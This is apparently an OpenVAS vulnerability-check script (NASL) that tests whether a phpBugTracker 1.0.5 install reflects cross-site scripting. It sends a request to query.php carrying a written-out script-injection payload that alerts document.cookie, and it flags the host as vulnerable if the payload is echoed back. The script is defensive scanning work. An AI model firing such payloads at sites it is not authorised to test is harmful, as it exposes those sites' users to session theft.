###############################################################################
# OpenVAS Vulnerability Test
#
# phpBugTracker Multiple Reflected Cross Site Scripting Vulnerabilities
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2011 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.900275");
  script_version("2019-05-14T12:12:41+0000");
  script_tag(name:"last_modification", value:"2019-05-14 12:12:41 +0000 (Tue, 14 May 2019)");
  script_tag(name:"creation_date", value:"2011-03-25 15:52:06 +0100 (Fri, 25 Mar 2011)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_name("phpBugTracker Multiple Reflected Cross Site Scripting Vulnerabilities");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/view/98572/ZSL-2011-4996.txt");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2011 SecPod");
  script_family("Web application abuses");
  script_dependencies("phpBugTracker_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("phpBugTracker/installed");

  script_tag(name:"impact", value:"Successful exploitation will allow attackers to execute arbitrary
  script code in the browser of an unsuspecting user in the context of the affected site.");

  script_tag(name:"affected", value:"phpBugTracker version 1.0.5");

  script_tag(name:"insight", value:"The multiple flaws are due to:

  - Input passed via the 'form' parameter to the 'query.php' script is not
  properly sanitized before being returned to the user.

  - 'newaccount.php' are also vulnerable because they fail to perform filtering
  when using the REQUEST_URI variable.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"This host is running phpBugTracker and is prone to multiple
  reflected cross-site scripting vulnerabilities.");

  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("http_func.inc");
include("version_func.inc");

phpPort = get_http_port(default:80);

dir = get_dir_from_kb(port:phpPort, app:"phpBugTracker");
if(!dir)
  exit(0);

url = string(dir, "/query.php?op=doquery&form=1>'><script>alert(document.cookie)</script>");
sndReq = http_get(item:url, port:phpPort);
rcvRes = http_send_recv(port:phpPort, data:sndReq);

if(rcvRes =~ "HTTP/1\.. 200" && ">alert(document.cookie)<" >< rcvRes){
  report = report_vuln_url(port:phpPort, url:url);
  security_message(port:phpPort, data:report);
}
